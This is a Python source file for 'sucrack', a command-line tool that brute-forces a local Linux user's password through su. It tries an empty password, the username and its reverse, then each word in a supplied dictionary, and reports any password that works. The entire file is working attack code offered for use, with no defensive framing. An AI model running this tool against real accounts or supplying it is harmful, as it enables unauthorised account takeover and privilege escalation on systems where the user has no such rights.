#!/usr/bin/env python3
#
# `sucrack` - free su password cracking utility, made by Archetypum.
#
# Copyright (C) 2025 Archetypum
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>

import os
import sys
import time
import typing
import argparse
import subprocess


def su_try_pwd(user: str, password: str, timeout: float) -> typing.NoReturn:
    try:
        result = subprocess.run(
            ["timeout", str(timeout), "su", user, "-c", "whoami"],
            input=password.encode(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout + 1
        )

        if result.returncode == 0:
            print(f"\n[*] Success! You can login as '{user}' using password: '{password}'.")
            sys.exit(0)

    except subprocess.TimeoutExpired:
        pass


def su_brute_user_num(user: str, dictionary: str, timeout: float, sleep_time: float) -> typing.NoReturn:
    print(f"[...] Bruteforcing '{user}'...\n")

    su_try_pwd(user, "", timeout)
    su_try_pwd(user, user, timeout)
    su_try_pwd(user, user[::-1], timeout)

    if os.path.isfile(dictionary):
        with open(dictionary, "r") as dictionary_file:
            for line in dictionary_file:
                password: str = line.strip()
                su_try_pwd(user, password, timeout)
                print(f"[<==] Trying '{password}'...")
                time.sleep(sleep_time)
    else:
        print(f"[!] Wordlist '{dictionary}' not found, aborting...")
        sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bruteforce a user with various passwords.")
    parser.add_argument("-u", "--user", required=True, help="Username to bruteforce")
    parser.add_argument("-d", "--dictionary", required=True, help="Path to dictionary file")
    parser.add_argument("-t", "--timeout", type=float, default=0.7, help="Timeout for 'su' process")
    parser.add_argument("-s", "--sleep", type=float, default=0.007, help="Sleep time between attempts")

    args = parser.parse_args()

    if not args.user:
        sys.exit(1)

    su_brute_user_num(args.user, args.dictionary, args.timeout, args.sleep)
    print("\n[!] Password not found: dictionary exhausted.")

